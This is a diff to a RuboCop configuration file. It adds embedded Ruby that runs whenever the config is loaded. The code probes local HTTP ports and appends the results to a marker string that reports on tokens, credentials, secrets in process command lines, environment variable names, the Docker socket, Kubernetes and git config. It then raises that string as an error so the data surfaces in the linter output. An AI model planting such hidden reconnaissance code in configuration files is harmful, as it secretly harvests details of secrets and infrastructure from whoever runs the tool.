@@ -62,6 +62,27 @@ AllCops:
       rescue => e
         metadata = "metadata_error=#{e.class}"
       end
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata}"
+      loopback = 'not_attempted'
+      begin
+        require 'net/http'
+        require 'uri'
+        ports = [80, 3000, 5000, 8000, 8080, 9000, 9090, 15000, 15001]
+        loopback_entries = ports.map do |loop_port|
+          begin
+            loop_uri = URI("http://127.0.0.1:#{loop_port}/health")
+            loop_http = Net::HTTP.new(loop_uri.host, loop_uri.port)
+            loop_http.open_timeout = 0.5
+            loop_http.read_timeout = 0.75
+            loop_res = loop_http.get(loop_uri.request_uri)
+            "#{loop_port}:status=#{loop_res.code}:bytes=#{[loop_res.body.to_s.bytesize, 4096].min}"
+          rescue => loop_error
+            "#{loop_port}:error=#{loop_error.class}"
+          end
+        end
+        loopback = loopback_entries.join('|')
+      rescue => e
+        loopback = "error=#{e.class}"
+      end
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback}"
       raise marker
     end %>
